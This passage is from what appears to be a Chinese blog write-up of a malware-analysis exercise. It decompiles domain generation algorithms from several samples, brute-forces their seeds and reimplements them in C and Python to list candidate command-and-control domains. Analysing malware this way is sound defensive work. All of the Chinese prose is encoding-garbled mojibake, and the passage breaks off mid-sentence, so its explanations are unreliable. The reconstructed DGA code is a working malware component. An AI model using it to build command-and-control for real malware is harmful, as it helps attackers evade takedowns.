class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v18[v7] ^= (<span class="keyword">unsigned</span> __int8)(a4 &gt;&gt; <span class="number">8</span> * (v7 &amp; <span class="number">3</span>));</span><br><span class="line">++v7;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 != <span class="number">8</span> );</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15[v8] = v18[v8];</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != <span class="number">8</span> );</span><br><span class="line">    v15[v8]=<span class="number">0</span>;</span><br><span class="line">    MD5_CTX md5;</span><br><span class="line">MD5Init(&amp;md5);        </span><br><span class="line">MD5Update(&amp;md5,v15,<span class="built_in">strlen</span>(v15));</span><br><span class="line">MD5Final(&amp;md5,(<span class="keyword">unsigned</span> __int8 *)v16);</span><br><span class="line"><span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line">v9 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v11 = (v16[v10] &amp; <span class="number">0xF</span>) + ((<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)v16[v10] &gt;&gt; <span class="number">4</span>) + <span class="number">97</span>;</span><br><span class="line"><span class="keyword">if</span> ( v11 &lt;= <span class="number">122</span> )</span><br><span class="line">&#123;</span><br><span class="line">v21[v9] = v11;</span><br><span class="line">v21[++v9] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">++v10;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v10 != <span class="number">16</span> );</span><br><span class="line">v12 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( v14 % (<span class="number">5</span> - v12) )</span><br><span class="line">&#123;</span><br><span class="line">++v12;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">strcat</span>(v21, v17[v12]);</span><br><span class="line"><span class="comment">//printf(&quot;%s\n&quot;,v21);</span></span><br><span class="line">++v14;</span><br><span class="line">&#125;<span class="keyword">while</span>(v14!=<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> v21;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> seed;</span><br><span class="line"><span class="keyword">char</span> correct[]=<span class="string">&quot;ezzijueztfslhhrp.biz&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(seed = <span class="number">0</span>;seed &lt; ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>)<span class="number">-1</span>) ;seed++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(correct,dga_v2(<span class="number">2020</span>,<span class="number">5</span>,<span class="number">10</span>,seed)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,seed);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·‘äº†æŒºä¹…çš„ï¼Œå¾—åˆ°ç§å­æ˜¯1836927723ï¼Œç›´æ¥ç”Ÿæˆå°±å¥½äº†ã€‚</p><h3 id="sample2"><a href="#sample2" class="headerlink" title="sample2"></a>sample2</h3><p>æ‹–åˆ°IDAåæ±‡ç¼–ï¼Œçœ‹åˆ°å°±ä¸€ä¸ªdgaå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dga(<span class="string">&quot;cw3OGGsoaako7GSGG3&quot;</span>, <span class="string">&quot;umyyobuorstfabj.com&quot;</span>, (<span class="keyword">char</span> (*)[<span class="number">5</span>])v4, <span class="number">3</span>, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>v4å¯ä»¥çœ‹åˆ°æ˜¯åŸŸåçš„åç¼€åï¼ŒåŒ…æ‹¬[â€˜pwâ€™, â€˜usâ€™, â€˜clubâ€™]ã€‚</p><p>çœ‹dgaå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">dga</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">char</span> *a2, <span class="keyword">char</span> (*a3)[<span class="number">5</span>], <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> (*v12)[<span class="number">5</span>]; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> (*v14)[<span class="number">5</span>]; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+1Ch] [ebp-CCh]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+20h] [ebp-C8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v17; <span class="comment">// [esp+24h] [ebp-C4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v18; <span class="comment">// [esp+28h] [ebp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+2Ch] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+31h] [ebp-B7h]</span></span><br><span class="line">  <span class="keyword">char</span> v21[<span class="number">4</span>]; <span class="comment">// [esp+32h] [ebp-B6h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+36h] [ebp-B2h]</span></span><br><span class="line">  <span class="keyword">int</span> v23[<span class="number">15</span>]; <span class="comment">// [esp+50h] [ebp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+8Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v25[<span class="number">22</span>]; <span class="comment">// [esp+90h] [ebp-58h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a2;                    </span><br><span class="line">  <span class="built_in">memset</span>(v23, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  *(_DWORD *)v21 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;                    </span><br><span class="line">  <span class="built_in">memset</span>(&amp;v22, <span class="number">0</span>, <span class="number">0x1A</span>u);</span><br><span class="line">  v6 = <span class="number">0</span>;                     </span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = a1[v6];</span><br><span class="line">    v17 += v7;</span><br><span class="line">    v23[v6++] = v7;         </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">16</span> );</span><br><span class="line">  v19 = <span class="number">0</span>;                 </span><br><span class="line">  v15 = (<span class="keyword">unsigned</span> __int8)v24;  </span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v19;</span><br><span class="line">    <span class="keyword">if</span> ( v19 &gt;= a5 )  </span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v25, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v25[v9] = v5[v9];</span><br><span class="line">      ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 != <span class="number">16</span> );        </span><br><span class="line">    v10 = v15;</span><br><span class="line">    v11 = <span class="number">1</span>;                  <span class="comment">//v11:1</span></span><br><span class="line">    <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="number">0x1E</span>u);</span><br><span class="line">    v18 = v17;                <span class="comment">//v18:0</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = (v18 ^ (*(&amp;v24 + v11) + v10)) + v25[v11];</span><br><span class="line">        v10 = (<span class="keyword">unsigned</span> __int8)v16;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)v16 - <span class="number">98</span> &lt;= <span class="number">0x17</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++v18;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v11;</span><br><span class="line">      *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = v16;</span><br><span class="line">      v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 != <span class="number">13</span> );</span><br><span class="line">    v12 = a3;</span><br><span class="line">    *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = <span class="number">46</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v13 &lt; a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = v12;</span><br><span class="line">      ++v13;</span><br><span class="line">      ++v12;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s%s\n&quot;</span>, v21, v14);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(v21, &amp;(*a3)[<span class="number">5</span> * a4 - <span class="number">5</span>]);</span><br><span class="line">    ++v19;</span><br><span class="line">    v5 = v21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”ŸæˆåŸŸåçš„é‡ç‚¹ä»£ç æ˜¯è¿™æ®µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = (v18 ^ (*(&amp;v24 + v11) + v10)) + v25[v11];</span><br><span class="line">        v10 = (<span class="keyword">unsigned</span> __int8)v16;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)v16 - <span class="number">98</span> &lt;= <span class="number">0x17</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++v18;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v11;</span><br><span class="line">      *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = v16;</span><br><span class="line">      v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 != <span class="number">13</span> );</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯åŠ åç¼€çš„ï¼Œä¸ç”¨ç®¡ã€‚</p><p>é‡Œé¢æ¶‰åŠçš„å˜é‡ï¼Œv18æ˜¯v17èµ‹å€¼ï¼Œv17æ˜¯â€œcw3OGGsoaako7GSGG3â€çš„asciiç çš„å’Œï¼ˆä½8ä½ï¼‰ã€‚</p><p>v11æ˜¯ä¸€ä¸ªä¸çŸ¥é“å“ªçš„æ•°ï¼Œv25æ˜¯â€œumyyobuorstfabj.comâ€ï¼Œv24æœªçŸ¥ã€‚v24å¾ˆå¥‡æ€ªï¼Œç”¨æ³•æ˜¯ç±»ä¼¼æ•°ç»„çš„ç”¨æ³•ï¼Œå£°æ˜å´æ˜¯intï¼Œæ‰‹åŠ¨æ”¹æˆintç±»å‹çš„æ•°ç»„ï¼Œé‡æ–°åç¼–è¯‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">dga</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">char</span> *a2, <span class="keyword">char</span> (*a3)[<span class="number">5</span>], <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> (*v12)[<span class="number">5</span>]; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> (*v14)[<span class="number">5</span>]; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+1Ch] [ebp-CCh]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+20h] [ebp-C8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v17; <span class="comment">// [esp+24h] [ebp-C4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v18; <span class="comment">// [esp+28h] [ebp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+2Ch] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+31h] [ebp-B7h]</span></span><br><span class="line">  <span class="keyword">char</span> v21[<span class="number">4</span>]; <span class="comment">// [esp+32h] [ebp-B6h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+36h] [ebp-B2h]</span></span><br><span class="line">  <span class="keyword">int</span> v23[<span class="number">15</span>]; <span class="comment">// [esp+50h] [ebp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v24[<span class="number">14</span>]; <span class="comment">// [esp+8Ch] [ebp-5Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = a2;</span><br><span class="line">  <span class="built_in">memset</span>(v23, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  *(_DWORD *)v21 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v22, <span class="number">0</span>, <span class="number">0x1A</span>u);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = a1[v6];</span><br><span class="line">    v17 += v7;</span><br><span class="line">    v23[v6++] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">16</span> );</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v15 = LOBYTE(v24[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v19;</span><br><span class="line">    <span class="keyword">if</span> ( v19 &gt;= a5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v24[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v24[v9 + <span class="number">1</span>] = v5[v9];</span><br><span class="line">      ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 != <span class="number">16</span> );</span><br><span class="line">    v10 = v15;</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="number">0x1E</span>u);</span><br><span class="line">    v18 = v17;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = (v18 ^ (v24[v11] + v10)) + v24[v11 + <span class="number">1</span>];</span><br><span class="line">        v10 = (<span class="keyword">unsigned</span> __int8)v16;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)v16 - <span class="number">98</span> &lt;= <span class="number">0x17</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++v18;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v11;</span><br><span class="line">      *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = v16;</span><br><span class="line">      v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 != <span class="number">13</span> );</span><br><span class="line">    v12 = a3;</span><br><span class="line">    *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = <span class="number">46</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v13 &lt; a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = v12;</span><br><span class="line">      ++v13;</span><br><span class="line">      ++v12;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s%s\n&quot;</span>, v21, v14);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(v21, &amp;(*a3)[<span class="number">5</span> * a4 - <span class="number">5</span>]);</span><br><span class="line">    ++v19;</span><br><span class="line">    v5 = v21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¥½çœ‹å¤šäº†ï¼Œä¹‹å‰çš„v24å’Œv25æŒ‡å‘çš„æ•°æ®æ˜¯åŒä¸€æ•°æ®ã€‚</p><p>å¾€ä¸‹çœ‹ï¼Œå‘ç°<code>v5 = v21;</code>ï¼Œv21ä¼šä½œä¸ºä¸‹ä¸€ä¸ªåŸŸåç”Ÿæˆç®—æ³•çš„è¾“å…¥ï¼Œè¦†ç›–â€umyyobuorstfabj.comâ€ã€‚</p><p>ç°åœ¨ä¹Ÿä¸çŸ¥é“é€‰äº†å“ªä¸ªåç¼€çš„åŸŸåä½œä¸ºçš„v21ï¼ŒåŠ¨æ€è°ƒä¸€ä¸‹ï¼Œå‘ç°æ˜¯clubã€‚</p><p>æˆ‘ä»¬æ²¡æœ‰a1å’Œa2ï¼Œä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªåŸŸåç”Ÿæˆç”¨åˆ°äº†a2ï¼Œåé¢çš„åŸŸåç”ŸæˆåŸºäºä¸Šä¸€ä¸ªåŸŸåï¼Œæˆ‘ä»¬é€‰ä¸€ç»„æŒ¨ç€çš„åŸŸåï¼Œa2çš„é—®é¢˜è§£å†³äº†ã€‚a1ä¹Ÿåªæ˜¯ç”¨äº†ä¸ªasciiç çš„å’Œï¼Œ256ç§å¯èƒ½ã€‚</p><p>è¿™é‡Œé¢è¿˜æœ‰ä¸ªv10ä¸çŸ¥é“ï¼Œ256ç§å¯èƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çˆ†ç ´256*256ç§å¯èƒ½ï¼Œè¿˜åŸå‡ºè¿™ä¸¤ä¸ªå€¼ã€‚</p><p>å¾—åˆ°äº†ä¸¤ç»„å€¼ï¼š84, 119ä¸85, 48ã€‚</p><p>ç„¶åç›´æ¥ç…§ç€ç®—æ³•é€»è¾‘è·‘å¯ä»¥å¾—åˆ°åé¢çš„æ‰€æœ‰åŸŸåï¼Œä¸txtä¸­ç»“æœæ¯”å¯¹ï¼Œå‘ç°84ï¼Œ119çš„æ˜¯æ­£ç¡®çš„ã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&quot;xuvsxyrbjiyv&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;rgujkdffrpde&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">v18, v10, s1</span>):</span></span><br><span class="line">    v11 = <span class="number">0</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            v16 = (v18 ^ (<span class="built_in">ord</span>(s1[v11]) + v10)) + <span class="built_in">ord</span>(s1[v11 + <span class="number">1</span>])</span><br><span class="line">            v10 = v16 &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> (v10 - <span class="number">98</span>) &amp; <span class="number">0xffffff</span> &lt;= <span class="number">0x17</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v18 += <span class="number">1</span></span><br><span class="line">        res += <span class="built_in">chr</span>(v10)</span><br><span class="line">        v11 += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v11 == <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for v18 in range(255):</span></span><br><span class="line"><span class="comment">#     for v10 in range(255):</span></span><br><span class="line"><span class="comment">#         if calc(v18,v10,s1) == s2:</span></span><br><span class="line"><span class="comment">#             print v18,v10</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line">v18, v10 = <span class="number">84</span>, <span class="number">119</span></span><br><span class="line"><span class="comment"># v18, v10 = 85, 48</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> [<span class="string">&#x27;pw&#x27;</span>, <span class="string">&#x27;us&#x27;</span>, <span class="string">&#x27;club&#x27;</span>]:</span><br><span class="line">        res.append(<span class="string">&quot;%s.%s&quot;</span> % (s1, ext))</span><br><span class="line">    s1 = calc(v18, v10, s1 + <span class="string">&quot;.club&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;domains2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>.join(res))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>(unsigned int)(unsigned __int8)v16 - 98 &lt;= 0x17</code> è¿™ä¸ªåˆ¤æ–­ï¼Œæ³¨æ„æ— ç¬¦å·æ•°ï¼Œå¼€å§‹pythonæ²¡æ³¨æ„åˆ°è¿™ä¸ªé—®é¢˜ï¼ŒåŠ¨æ€è°ƒè¯•äº†ä¸€ä¼šæ‰å‘ç°è¿™é‡Œçš„é—®é¢˜ã€‚</p><h3 id="sample3"><a href="#sample3" class="headerlink" title="sample3"></a>sample3</h3><p>æ‹–è¿›IDAåˆ†æï¼Œä»£ç 